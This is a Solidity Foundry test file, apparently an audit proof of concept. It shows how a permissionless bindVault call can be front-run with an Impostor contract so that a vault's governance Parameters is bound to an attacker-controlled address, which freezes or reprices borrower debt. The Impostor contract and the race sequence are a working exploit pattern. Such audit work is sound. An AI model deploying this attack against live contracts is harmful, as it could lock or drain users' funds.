// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test} from "forge-std/Test.sol";
import {MockIMD} from "src/MockIMD.sol";
import {Parameters, ICheckpointedVault} from "src/Parameters.sol";
import {ParameterizedVault} from "src/ParameterizedVault.sol";
import {ISwarmFeed} from "src/interfaces/ISwarmFeed.sol";
import {APPROVED_OPERATOR, STABILITY_FEE_BPS} from "src/DeploymentConfig.sol";

/// @dev Minimal controllable feed, so this file depends on nothing under test/.
contract Feed is ISwarmFeed {
    uint256 public constant maxAge = 1 days;
    uint256 private value;
    uint64 private updatedAt;

    constructor(uint256 v) {
        value = v;
        updatedAt = uint64(block.timestamp);
    }

    function latestValue() external view returns (uint256, uint64) {
        return (value, updatedAt);
    }

    function isStale() external pure returns (bool) {
        return false;
    }
}

/// @notice Ten lines satisfy the only check bindVault performs. It is not a vault.
contract Impostor {
    address public immutable parameters;

    constructor(address parameters_) {
        parameters = parameters_;
    }

    /// @dev Reports whatever debt is convenient: zero lets any ceiling through the live-debt check.
    function totalDebt() external pure returns (uint256) {
        return 0;
    }

    /// @dev The real vault is never poked. (Reverting here instead would freeze governance forever.)
    function pokeIndex() external {}
}

/// @notice Finding: bindVault is permissionless and accepts any contract whose parameters() returns
/// address(this). An attacker who lands bindVault(impostor) between `new Parameters(0)` and the
/// deployer's own bindVault (DeployGoverned.s.sol sends them as separate transactions) binds the
/// real vault's Parameters to a contract it controls. The real vault's `parameters` is immutable,
/// so the link can never be repaired.
contract BindHijackTest is Test {
    address private constant BORROWER = address(0xB0B);
    address private constant ATTACKER = address(0xBAD);

    MockIMD private imd;
    Feed private price;
    Feed private spot;
    Feed private nhi;

    function setUp() public {
        // Auditor-supplied proof, preserved verbatim apart from this gate. It is EXPECTED TO
        // FAIL until the finding is fixed; run with AUDIT_PROOFS=true to reproduce it. Gated so
        // the default suite stays green, because a permanently red test is one no agent can
        // make pass and it burns a build node's whole revision budget.
        if (!vm.envOr("AUDIT_PROOFS", false)) vm.skip(true);

        vm.warp(10 days);
        imd = new MockIMD();
        price = new Feed(1 ether);
        spot = new Feed(1 ether);
        nhi = new Feed(0.9 ether);
    }

    /// @dev Deployer tx 1 and 2 as in DeployGoverned.run(); the attacker's bind lands before tx 3.
    /// Both binds are sent as raw calls so that a fix which makes either one revert is tolerated.
    function _deployStackWithRace() private returns (Parameters params, ParameterizedVault vault, Impostor impostor) {
        params = new Parameters(ICheckpointedVault(address(0)));
        vault = new ParameterizedVault(
            address(imd), address(0), address(0), address(price), address(nhi), address(spot), params
        );
        vm.startPrank(ATTACKER);
        impostor = new Impostor(address(params));
        (bool attackerBound,) = address(params).call(abi.encodeCall(params.bindVault, (ICheckpointedVault(address(impostor)))));
        vm.stopPrank();
        attackerBound; // silence the warning; what matters is read back below
        // Deployer tx 3, from the operator.
        vm.prank(APPROVED_OPERATOR);
        (bool ok,) = address(params).call(abi.encodeCall(params.bindVault, (ICheckpointedVault(address(vault)))));
        ok;
    }

    /// @dev Expected: only the vault that names this Parameters can be bound, so after the deployer's
    /// own bindVault parameters.vault() == vault. Actual: the impostor is bound (one call, no
    /// authority) and the deployer's bindVault reverts AlreadyBound.
    function test_aStrangerCannotBindAContractThatIsNotTheVault() public {
        (Parameters params, ParameterizedVault vault,) = _deployStackWithRace();
        assertEq(address(params.vault()), address(vault), "parameters must be bound to the vault that names them");
    }

    /// @dev What the misbinding buys: a rate change applies to the real vault without the real vault
    /// being poked, so the new rate reaches every second already elapsed. With a rate CUT the index
    /// falls below the borrower's recorded index and every debt read on the real vault reverts.
    function test_misboundParametersRepriceOrFreezeTheRealVault() public {
        (Parameters params, ParameterizedVault vault,) = _deployStackWithRace();

        vm.prank(APPROVED_OPERATOR);
        imd.mint(BORROWER, 1_000 ether);
        vm.startPrank(BORROWER);
        imd.approve(address(vault), type(uint256).max);
        vault.depositCollateral(1_000 ether);
        vault.mintCOMP(100 ether);
        vm.stopPrank();
        assertEq(STABILITY_FEE_BPS, 200, "shipped rate is 2%");

        // Half a year in the borrower touches the position (1 wei repayment), recording
        // debtIndexOf = 1.01e18 and banking ~1 COMP of fees; then another half year.
        vm.warp(block.timestamp + 182 days);
        vm.prank(BORROWER);
        vault.repayCOMP(1);
        vm.warp(block.timestamp + 183 days);

        // Governor cuts the rate to zero. Honest binding: pokeIndex freezes ~2 COMP of fees, nothing
        // more accrues. Hijacked binding: the real vault is never poked.
        vm.prank(APPROVED_OPERATOR);
        params.propose(Parameters.ParamSet(type(uint256).max, 3_333, 0, 500, 1_000));
        vm.warp(block.timestamp + params.TIMELOCK());
        uint256 owedBefore = vault.debtOf(BORROWER); // 100 + ~2 COMP, the instant before the change
        params.applyPending();
        assertEq(vault.stabilityFeeBps(), 0);

        // On the code as it is: debtIndex() is indexCheckpoint (1e18) + 0, below the ~1.01e18
        // recorded for the borrower, the subtraction in stabilityFeeOf underflows (panic 0x11) and
        // the position cannot be read, repaid, withdrawn or liquidated. (A borrower who never
        // re-accrued instead sees the year's fees vanish; a rate RISE reprices the whole year.)
        uint256 owedAfter = vault.debtOf(BORROWER);
        assertEq(owedAfter, owedBefore, "a forward-only rate change leaves accrued fees unchanged");
        vm.prank(BORROWER);
        vault.repayCOMP(1 ether);
    }
}